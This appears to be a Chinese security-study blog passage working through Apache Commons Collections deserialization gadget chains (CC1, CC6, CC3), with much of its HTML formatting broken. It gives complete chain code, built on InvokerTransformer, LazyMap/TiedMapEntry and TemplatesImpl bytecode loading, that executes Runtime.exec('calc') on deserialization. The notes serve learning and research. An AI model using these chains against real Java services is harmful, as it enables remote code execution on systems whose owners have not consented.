class="line">不知道差哪了，用官网的重新装了一下，注意jdk和jre别放在同一文件夹里，要分开，不然报错</span><br><span class="line"></span><br><span class="line">然后把jdk-af660750b2f4\src\share\classes里面的run拷贝到8u65的src，目的是能把 .class 文件转换为 .java 文件</span><br><span class="line"></span><br><span class="line">![image-20250123135024200](https://github.com/DDL08/images/blob/img/img/image-20250123135024200.png?raw=true)</span><br><span class="line"></span><br><span class="line">### find usages只有一个</span><br><span class="line"></span><br><span class="line">这一个还是自己写的，我以为是我社区版的原因我去破解了一下idea，结果发现还是这样，还好最终在Drunkbaby的教学中看到了ctrl+alt+shif+f7可以修改这玩意🤣</span><br><span class="line"></span><br><span class="line">![image-20250123170922648](https://github.com/DDL08/images/blob/img/img/image-20250123170922648.png?raw=true)</span><br><span class="line"></span><br><span class="line">![image-20250123171502441](https://github.com/DDL08/images/blob/img/img/image-20250123171502441.png?raw=true)</span><br><span class="line"></span><br><span class="line">然后就可以查了</span><br><span class="line"></span><br><span class="line">## 操作</span><br><span class="line"></span><br><span class="line">### 基础反射</span><br><span class="line"></span><br><span class="line">1. 获取类</span><br><span class="line">2. 获取类的方法</span><br><span class="line">3. 设置私有属性可读</span><br><span class="line">4. 调用类里的方法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Runtime runtime &#x3D; Runtime.getRuntime();</p>
<p>Class c &#x3D; Runtime.class;  </p>
<p>Method method &#x3D; c.getDeclaredMethod(“exec”, String.class); </p>
<p>method.setAccessible(true);  </p>
<p>method.invoke(c, “calc”);  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">另类标准反射👇</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Class c &#x3D;Runtime.class;</p>
<p>Method getRuntimeMethod &#x3D; c.getMethod(“getRuntime”);</p>
<p>Runtime r &#x3D; (Runtime)getRuntimeMethod.invoke(null,null);</p>
<p>Method execMethod &#x3D; c.getMethod(“exec”,String.class);</p>
<p>execMethod.invoke(r,”calc”);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 改为InvokeTransform的形式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Runtime runtime &#x3D; Runtime.getRuntime();  </p>
<p>InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(“exec”, new Class[]{String.class} , new Object[]{“calc”});  </p>
<p>invokerTransformer.transform(runtime);  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 理想链子</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>package org.example;<br>import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedClosure;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.map.TransformedMap;</p>
<p>import java.io.*;<br>import java.lang.annotation.Target;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.Method;<br>import java.util.HashMap;<br>import java.util.Map;</p>
<p>public class Main {<br>    public static void main(String[] args) throws Exception{</p>
<pre><code>    Runtime runtime = Runtime.getRuntime();
    InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
    hashMap.put(&quot;key&quot;, &quot;value&quot;);
    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
    
    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
    aihConstructor.setAccessible(true);
    Object o = aihConstructor.newInstance(Override.class, transformedMap);

    // 序列化反序列化
    serialize(o);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 需要解决三个问题</span><br><span class="line"></span><br><span class="line">### 解决Runtime无法序列化</span><br><span class="line"></span><br><span class="line">下边给出了对比（和标准反射的比，已经注释掉</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>public static void main(String[] args) {<br>Transformer[] transformers &#x3D; new Transformer[]{<br>                &#x2F;&#x2F;Method getRuntimeMethod &#x3D; c.getMethod(“getRuntime”);<br>new InvokerTransformer(“getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, null}),<br>                &#x2F;&#x2F;Runtime r &#x3D; (Runtime)getRuntimeMethod.invoke(null,null);<br>new InvokerTransformer(“invoke”, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br>                &#x2F;&#x2F;Method method &#x3D; c.getDeclaredMethod(“exec”, String.class);<br>                &#x2F;&#x2F;method.invoke(c, “calc”);<br>new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc”})<br>        };<br>ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);<br>chainedTransformer.transform(Runtime.class);<br>    }</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 完整链子</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  
            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
    hashMap.put(&quot;value&quot;,&quot;drunkbaby&quot;);
    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
    
    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
    aihConstructor.setAccessible(true);
    Object o = aihConstructor.newInstance(Target.class, transformedMap);

    // 序列化反序列化  
    serialize(o);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 思路</span><br><span class="line"></span><br><span class="line">1. 从里往外推，危险函数是InvokeTransformer类里面的transform方法，</span><br><span class="line"></span><br><span class="line">   1. 这个方法就跟反射那个差不多，获取类，获取方法，调用</span><br><span class="line">   2. 这个类有三个参数</span><br><span class="line">      1. 字符串参数名</span><br><span class="line">      2. Class数据参数类型</span><br><span class="line">      3. 对象数组参数值</span><br><span class="line"></span><br><span class="line">2. 追踪，在checkSetValue中属性valueTransformer被调用</span><br><span class="line"></span><br><span class="line">   1. valuetransformer是TransformedMap中赋予的一个变量</span><br><span class="line">      1. 因为这个transformMap是个protect类，需要在InvokeTransformer类里面调用，恰好有个decorate类去给TransformMap赋值</span><br><span class="line"></span><br><span class="line">3. 追踪，checkSetValue被setValue调用，setValue是MapEntry类（继承AbstractMapEntryDecorator）里的方法</span><br><span class="line"></span><br><span class="line">   1. Entry是一个键值对就是Entry</span><br><span class="line"></span><br><span class="line">4. 然后去遍历map使用setValue方法，</span><br><span class="line"></span><br><span class="line">5. 查找调用setValue的readobject</span><br><span class="line"></span><br><span class="line">   1. 在AnnotationInvocationHandler里的readobject方法里被调用</span><br><span class="line"></span><br><span class="line">   2. 这里面有遍历数组的功能，但是需要绕过if</span><br><span class="line"></span><br><span class="line">   3. 接收class对象和map俩对象</span><br><span class="line"></span><br><span class="line">   4. 没有类型就是default类型，需要通过反射获取</span><br><span class="line"></span><br><span class="line">   5. 反射获取全名</span><br><span class="line"></span><br><span class="line">      - ```</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></pre></td></tr></table></figure>

<pre><code>  - ```
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
    aihConstructor.setAccessible(true);  
    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  Object o = aihConstructor.newInstance(Override.class, transformedMap); </span><br></pre></td></tr></table></figure>
</code></pre>
<ol start="6">
<li><p>构造出理想链子之后还需要解决三个问题</p>
<ol>
<li>Runtime对象不可序列化，需通过反射变成可序列化的形式<ol>
<li>上边给出</li>
<li>从代码的复用性角度来说，我们应当减少这种复用的工作量，于是我们使用 <code>ChainedTransformer</code> 这个类。</li>
<li><code>ChainedTransformer</code> 类下的 <code>transform</code> 方法递归调用了前一个方法的结果，作为后一个方法的参数。</li>
</ol>
</li>
<li>进入setValue的两个if判断<ol>
<li>重写overide里面有Target里面有value</li>
</ol>
</li>
<li>最后的返回值<ol>
<li>最后利用，能够解决 <code>setValue</code> 可控参数的类 ———— <code>ConstantTransformer</code></li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="使用辅助函数"><a href="#使用辅助函数" class="headerlink" title="使用辅助函数"></a>使用辅助函数</h1><ul>
<li>ChainedTransformer<ul>
<li>传入一个transform数组</li>
<li>他有个transform函数有个transform方法，将前一个输出转为后一个的输入</li>
</ul>
</li>
</ul>
<h1 id="CC6链子"><a href="#CC6链子" class="headerlink" title="CC6链子"></a>CC6链子</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC6 链被称为最好用的 CC 链，是因为其不受 jdk 版本的影响，无论是 jdk8u65，或者 jdk9u312 都可以复现。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">	HashMap.put()	#HashMap.put() --自动调用--&gt;   HashMap.hash()</span><br><span class="line">	HashMap.hash()</span><br><span class="line">		TiedMapEntry.hashCode()</span><br><span class="line">		TiedMapEntry.getValue()</span><br><span class="line">			LazyMap.get()</span><br><span class="line">				ChainedTransformer.transform()</span><br><span class="line">					InvokerTransformer.transform()</span><br><span class="line">						Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="完整链子"><a href="#完整链子" class="headerlink" title="完整链子"></a>完整链子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;  </span><br><span class="line">    Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">    new ConstantTransformer(Runtime.class),  </span><br><span class="line">    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  </span><br><span class="line">    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  </span><br><span class="line">    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">    &#125;;  </span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">    HashMap&lt;Object,Object&gt; map = new HashMap&lt;Object,Object&gt;();  </span><br><span class="line">    Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,new ConstantTransformer(1));  </span><br><span class="line">  </span><br><span class="line">    HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;aaa&quot;);  </span><br><span class="line">  </span><br><span class="line">    map2.put(tiedMapEntry,&quot;bbb&quot;);  </span><br><span class="line">    map.remove(&quot;aaa&quot;);  </span><br><span class="line">  </span><br><span class="line">    Class c = LazyMap.class;  </span><br><span class="line">    Field fieldfactory = c.getDeclaredField(&quot;factory&quot;);  </span><br><span class="line">    fieldfactory.setAccessible(true);  </span><br><span class="line">    fieldfactory.set(lazymap,chainedTransformer);  </span><br><span class="line">    serialize(map2);  </span><br><span class="line">    unserialize(&quot;ser.bin&quot;);  </span><br><span class="line">  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>有方法调用就会调用invoke</p>
<p>有个put是把键值对提前放入Entry里面</p>
<ul>
<li>map2.put(tiedMapEntry,”bbb”); </li>
<li>map.remove(“aaa”);</li>
</ul>
<p>前半段和cc1一样用的是ChainedTransformer，后半段是</p>
<ol>
<li>用的危险函数还是transform</li>
<li>第二层是LazyMap的get方法</li>
<li><code>TiedMapEntry</code> 类中的 <code>getValue()</code> 方法<ol>
<li>这个不是get方法追溯的的了，追溯有4千+找不到</li>
<li>ysoSerial官方的链子里这个类的map属性在getKey中调用了这个get方法</li>
</ol>
</li>
<li></li>
</ol>
<h1 id="CC3链子"><a href="#CC3链子" class="headerlink" title="CC3链子"></a>CC3链子</h1><p>从外往里结构图</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>这里还是从里往外推，核心函数从Runtime.exec换成 <strong>ClassLoader的defineClass</strong>，这样能实现的功能就多了（远程加载类</p>
<ol>
<li><p>首先是 <code>loadClass()</code>，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 <code>findClass()</code>。</p>
</li>
<li><p>findclass触发defineClass</p>
<ol>
<li><p>把class处理成java类</p>
</li>
<li><pre><code>public Class findClass(String name) &#123;
    byte[] b = loadClassData(name);
    return defineClass(name, b, 0, b.length);
         &#125;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. 查找使用defineClass的方法（classloader里面的是protected的类</span><br><span class="line"></span><br><span class="line">   1. `TemplatesImpl` 类的 `static class TransletClassLoader` 中找到了我们能够运用的类。</span><br><span class="line">   2. 里面有个defualt的类defineclass</span><br><span class="line"></span><br><span class="line">4. 追踪</span><br><span class="line"></span><br><span class="line">   1. 找到`TemplatesImpl` 类的defineTransletClasses()</span><br><span class="line">   2. 这是private方法</span><br><span class="line"></span><br><span class="line">5. 追踪</span><br><span class="line"></span><br><span class="line">   1. `getTransletInstance()` 方法调用了 `defineTransletClasses()` 方法</span><br><span class="line">   2. 这个方法是私有的，继续找</span><br><span class="line"></span><br><span class="line">6. 追踪</span><br><span class="line"></span><br><span class="line">   1. 最后找到public方法.newTransformer()</span><br><span class="line"></span><br><span class="line">7. 开启第一层调用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 操作</span><br><span class="line"></span><br><span class="line">### 第一层调用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
</li>
</ol>
<p>TemplatesImpl templates &#x3D; new TemplatesImpl();<br>templates.newTransformer();<br>&#x2F;&#x2F; 因为是一层层调用的，我们需要后续赋值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 然后处理传参</span><br><span class="line"></span><br><span class="line">追踪数据可以查看类型</span><br><span class="line"></span><br><span class="line">_name不能为null</span><br><span class="line"></span><br><span class="line">_class应该为null</span><br><span class="line"></span><br><span class="line">然后追踪defineTransletClasses()</span><br><span class="line"></span><br><span class="line">_bytecodes不能为空，并且他传进去的是个二维数组，在数组里面会进行遍历传入defineclass，那么就套俩数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>byte[] evil &#x3D; Files.readAllBytes(Paths.get(“E:&#x2F;&#x2F;Call.class”));<br>byte[][] codes &#x3D; {evil};</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">call代码如下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>package org.example;<br>import java.io.IOException;<br>public class call {<br>    static {<br>        try {<br>            Runtime.getRuntime().exec(“calc”);<br>        } catch (IOException e){<br>            e.printStackTrace();<br>        }<br>    }<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 基础模板代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();

    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    templates.newTransformer();
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后去结决父类报错问题</span><br><span class="line"></span><br><span class="line">### 结合cc1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();

    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(templates),
            new InvokerTransformer(&quot;newTransformer&quot;, null, null)
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    //   chainedTransformer.transform(1);
    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
    hashMap.put(&quot;value&quot;,&quot;drunkbaby&quot;);
    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
    aihConstructor.setAccessible(true);
    Object o = aihConstructor.newInstance(Target.class, transformedMap);
    // 序列化反序列化
    serialize(o);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;    public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();

    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(templates),
            new InvokerTransformer(&quot;newTransformer&quot;, null, null)
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    //   chainedTransformer.transform(1);
    HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
    hashMap.put(&quot;value&quot;,&quot;drunkbaby&quot;);
    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
    aihConstructor.setAccessible(true);
    Object o = aihConstructor.newInstance(Target.class, transformedMap);
    // 序列化反序列化
    serialize(o);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 完整版</span><br><span class="line"></span><br><span class="line">cc1和cc6用的是invoketransformer，yso用的是instantiatetransformer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});<br>instantiateTransformer.transform(TrAXFilter.class);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最终就是</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception &#123;
    TemplatesImpl templates = new TemplatesImpl();

    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates, &quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates, codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);
    instantiateTransformer.transform(TrAXFilter.class);
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 报错</span><br><span class="line"></span><br><span class="line">看到报错直接点，点完往上走点打断点</span><br><span class="line"></span><br><span class="line">因为上面有个检测父类是否为xxx的</span><br><span class="line"></span><br><span class="line">![image-20250126192646191](https://github.com/DDL08/images/blob/img/img/image-20250126192646191.png?raw=true)</span><br><span class="line"></span><br><span class="line">### 法一</span><br><span class="line"></span><br><span class="line">将计算器的代码继承里面的父类，并且把这个抽象类的方法重写一下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>import com.sun.org.apache.xalan.internal.xsltc.DOM;<br>import com.sun.org.apache.xalan.internal.xsltc.TransletException;<br>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br>import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br>import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</p>
<p>import java.io.IOException;</p>
<p>public class call extends AbstractTranslet {<br>    static {<br>        try {<br>            Runtime.getRuntime().exec(“calc”);<br>        } catch (IOException e) {<br>            throw new RuntimeException(e);<br>        }<br>    }<br>    @Override<br>    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {</p>
<pre><code>&#125;
@Override
public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;

&#125;
</code></pre>
<p>}</p>
